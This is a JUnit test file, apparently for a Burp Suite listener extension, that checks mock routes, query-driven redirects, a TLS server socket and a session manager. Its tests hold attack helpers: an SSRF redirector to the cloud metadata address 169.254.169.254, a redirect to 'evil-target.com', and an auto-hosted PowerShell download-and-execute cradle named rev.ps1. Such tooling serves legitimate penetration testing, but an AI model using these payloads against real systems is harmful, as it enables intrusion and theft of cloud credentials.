package burp;

import burp.listener.MockRoute;
import burp.listener.SessionManager;
import burp.listener.TlsSocketHelper;
import burp.listener.WebhookResponseConfig;
import org.junit.Test;

import javax.net.ssl.SSLContext;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.Executors;

import static org.junit.Assert.*;

public class FeatureExpansionTest {

    @Test
    public void testMockRoutesAndRedirects() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // 1. Test /redirect route (SSRF Redirector)
        byte[] redirectResp = config.buildResponseBytes("10.10.10.2", "GET", "/redirect", 8080, "Host: 10.10.10.2", 0);
        String redirectStr = new String(redirectResp, StandardCharsets.UTF_8);
        assertTrue(redirectStr.contains("HTTP/1.1 302 Found"));
        assertTrue(redirectStr.contains("Location: http://169.254.169.254/latest/meta-data/"));

        // 2. Test /aws-meta route
        byte[] awsResp = config.buildResponseBytes("10.10.10.2", "GET", "/aws-meta", 8080, "Host: 10.10.10.2", 0);
        String awsStr = new String(awsResp, StandardCharsets.UTF_8);
        assertTrue(awsStr.contains("HTTP/1.1 200 OK"));
        assertTrue(awsStr.contains("instanceId"));

        // 3. Test Auto-Host Payload
        config.autoHostPayload("powershell -c \"iex(new-object net.webclient).downloadstring('...')\"", "rev.ps1");
        byte[] payloadResp = config.buildResponseBytes("10.10.10.2", "GET", "/rev.ps1", 8080, "Host: 10.10.10.2", 0);
        String payloadStr = new String(payloadResp, StandardCharsets.UTF_8);
        assertTrue(payloadStr.contains("powershell -c"));
    }

    @Test
    public void testQueryParameterOverrides() {
        WebhookResponseConfig config = new WebhookResponseConfig();

        // Test dynamic ?status=302&location=https://evil-target.com
        byte[] dynRedirect = config.buildResponseBytes("10.10.10.5", "GET", "/?status=302&location=https://evil-target.com", 8080, "Host: test", 0);
        String dynRedirectStr = new String(dynRedirect, StandardCharsets.UTF_8);
        assertTrue(dynRedirectStr.contains("HTTP/1.1 302"));
        assertTrue(dynRedirectStr.contains("Location: https://evil-target.com"));

        // Test dynamic ?status=401&body=UnauthorizedAccess
        byte[] dynAuth = config.buildResponseBytes("10.10.10.5", "GET", "/?status=401&body=UnauthorizedAccess", 8080, "Host: test", 0);
        String dynAuthStr = new String(dynAuth, StandardCharsets.UTF_8);
        assertTrue(dynAuthStr.contains("HTTP/1.1 401"));
        assertTrue(dynAuthStr.contains("UnauthorizedAccess"));
    }

    @Test
    public void testTlsSocketHelper() throws Exception {
        SSLContext sslContext = TlsSocketHelper.createSslContext();
        assertNotNull(sslContext);
        assertEquals("TLS", sslContext.getProtocol());

        // Test creating an actual SSLServerSocket and accepting a test client
        javax.net.ssl.SSLServerSocket serverSocket = TlsSocketHelper.createTlsServerSocket(0, 5, java.net.InetAddress.getByName("127.0.0.1"));
        assertNotNull(serverSocket);
        int localPort = serverSocket.getLocalPort();

        Thread serverThread = new Thread(() -> {
            try (javax.net.ssl.SSLSocket client = (javax.net.ssl.SSLSocket) serverSocket.accept()) {
                client.getOutputStream().write("HTTP/1.1 200 OK\r\n\r\nTLS OK".getBytes(StandardCharsets.UTF_8));
                client.getOutputStream().flush();
            } catch (Exception ignored) {}
        });
        serverThread.start();

        javax.net.ssl.SSLSocket clientSocket = (javax.net.ssl.SSLSocket) sslContext.getSocketFactory().createSocket("127.0.0.1", localPort);
        clientSocket.startHandshake();

        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(clientSocket.getInputStream()));
        String line = reader.readLine();
        assertEquals("HTTP/1.1 200 OK", line);

        clientSocket.close();
        serverSocket.close();
    }

    @Test
    public void testSessionManager() {
        SessionManager manager = new SessionManager(Executors.newCachedThreadPool());
        assertNotNull(manager.getAllSessions());
        assertEquals(0, manager.getActiveSessionCount());
    }
}
